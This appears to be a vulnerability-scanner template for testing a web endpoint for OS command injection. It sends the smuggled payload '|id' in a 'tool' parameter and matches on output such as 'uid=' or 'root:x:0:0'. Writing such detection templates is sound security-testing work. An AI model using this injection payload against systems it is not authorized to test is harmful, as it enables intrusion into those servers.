id: cmdi6-0642
name: 'Shell injection in tool'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via tool'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      tool:
        - '|id'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'www-data'
